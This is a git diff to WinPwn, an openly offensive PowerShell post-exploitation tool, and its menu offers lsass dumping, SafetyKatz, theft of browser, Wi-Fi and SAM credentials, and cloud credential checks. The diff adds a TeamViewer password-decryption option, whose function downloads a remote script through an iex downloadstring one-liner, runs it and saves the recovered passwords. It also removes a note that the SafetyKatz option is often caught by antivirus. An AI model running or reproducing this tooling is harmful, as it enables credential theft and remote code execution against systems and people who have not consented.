@@ -453,15 +453,16 @@ __        ___       ____
             Write-Host "================ WinPwn ================"
             Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
             Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie! '
-            Write-Host -ForegroundColor Green '3. Run Safetykatz in memory (Admin session only) - often detected by AV atm. the process gets killed here! '
+            Write-Host -ForegroundColor Green '3. Run Safetykatz in memory (Admin session only)! '
             Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
             Write-Host -ForegroundColor Green '5. Download and run an obfuscated lazagne executable! '
             Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
             Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
             Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
 	        Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
-	        Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'	    
-	        Write-Host -ForegroundColor Green '11. Exit. '
+	        Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'
+		Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords!'
+	        Write-Host -ForegroundColor Green '12. Exit. '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -477,11 +478,21 @@ __        ___       ____
 		        8{if(isadmin){wificreds}}
 		        9{if(isadmin){samfile}}
 			10{SharpCloud}
+			11{decryptteamviewer}
              }
         }
-        While ($masterquestion -ne 11)
+        While ($masterquestion -ne 12)
 }
+function decryptteamviewer
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1')
+    TeamviewerDecrypt >> $currentPath\Exploitation\TeamViewerPasswords.txt
+    Get-Content $currentPath\Exploitation\TeamViewerPasswords.txt
+    Start-Sleep 5
 
+}
 function SharpCloud
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
